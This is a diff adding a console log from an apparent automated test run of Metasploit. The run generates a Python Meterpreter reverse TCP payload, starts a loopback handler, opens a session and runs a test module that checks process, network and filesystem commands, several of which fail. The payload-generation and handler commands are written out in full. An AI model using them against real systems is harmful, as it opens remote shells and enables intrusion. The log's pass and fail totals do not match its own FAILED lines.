@@ -1,0 +1,72 @@
+use python/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-6932-f10qie.py -f raw MeterpreterTryToFork=false lport=6005 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 115725 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-6932-f10qie.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 4
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:50035 ) at 2022-01-19 00:37:34 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=5 addentropy=true verbose=true
+
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Running against session 5
+[*] Session type is meterpreter and platform is windows
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting process tests
+[*] Pid: 4600
+[+] should return its own process id
+[*] PID info: {"pid"=>4600, "ppid"=>6932, "name"=>"python.exe", "path"=>"C:\\msys64\\mingw64\\bin\\python.exe", "session"=>nil, "user"=>"fv-az159-2\\runneradmin", "arch"=>"x64"}
+[+] should return a list of processes
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[-] FAILED: should return the proper directory separator
+[*] CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[+] should return the current working directory
+[-] FAILED: should list files in the current directory
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Current directory: "C:/Users/RUNNER~1/AppData/Local/Temp"
+[-] FAILED: should stat a directory
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_stat: Operation failed: Unknown error
+[*] Directory Name: meterpreter-test-dir-dcjxzbek
+[-] FAILED: should create and remove a dir
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Directory Name: meterpreter-test-dir-dcjxzbek
+[-] FAILED: should change directories
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] File Name: meterpreter-test-dcjxzbek
+[*] Wrote to meterpreter-test-dcjxzbek, checking contents
+[*] Wrote test
+[-] FAILED: should create and remove files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Remote File Name: meterpreter-test-file-dcjxzbek.txt
+[*] uploading
+[*] done
+[*] remote file exists? false
+[-] FAILED: should upload a file
+[*] Source File Name: meterpreter-test-dcjxzbek
+[*] Destination File Name: meterpreter-test-dcjxzbek-moved
+[-] FAILED: should move files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Source File Name: meterpreter-test-dcjxzbek
+[*] Destination File Name: meterpreter-test-dcjxzbek-copied
+[-] FAILED: should copy files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Remote File Name: meterpreter-test-file-dcjxzbek.txt
+[*] uploading
+[*] done
+[*] remote file exists? false
+[-] FAILED: should do md5 and sha1 of files
+[*] Testing complete in 0.9493102
+[-] Passed: 17; Failed: 3
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
